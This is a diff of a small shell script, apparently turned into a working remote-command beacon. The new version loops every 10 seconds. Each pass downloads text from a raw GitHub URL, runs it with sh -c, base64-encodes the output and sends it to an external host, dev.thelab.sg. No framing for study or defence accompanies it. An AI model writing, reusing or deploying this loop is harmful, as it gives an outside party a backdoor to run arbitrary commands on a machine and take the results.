@@ -1,38 +1,19 @@
-#!/bin/bash
-
-# URL of the text file
-URL="http://example.com/hello.txt"
-# Second URL to send the data
-URL2="http://example.com/receive"
-# Proxy server URL
-PROXY_URL="http://proxy.example.com:3128"
-
-# Variable to store the previous content
-prev_content=""
+#!/bin/sh
+URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt"
+URL2="https://dev.thelab.sg"
 
 while true; do
     # Fetch the current file content using the proxy and store in variable
-    current_content=$(curl -x "$PROXY_URL" -s "$URL")
-    
-    # Check if the file content has changed
-    if [ "$current_content" != "$prev_content" ]; then
-        echo "File has changed. Executing the script..."
-        
+    current_content=$(curl -s "$URL")
+
+
         # Run the content as a script and capture the output
-        output=$(bash -c "$current_content")
-        
+        output=$(sh -c "$current_content")
+#       echo $output
         # Encode the output in Base64
         base64_output=$(echo "$output" | base64)
-        
+
         # Send the encoded output as a GET parameter to the second URL using the proxy
-        curl -x "$PROXY_URL" -G --data-urlencode "data=$base64_output" "$URL2"
-        
-        # Update the previous content
-        prev_content="$current_content"
-    else
-        echo "No change in file. Skipping execution..."
-    fi
-    
-    # Wait for a minute before the next check
-    sleep 60
+        curl -S -s $URL2/$base64_output
+    sleep 10
 done
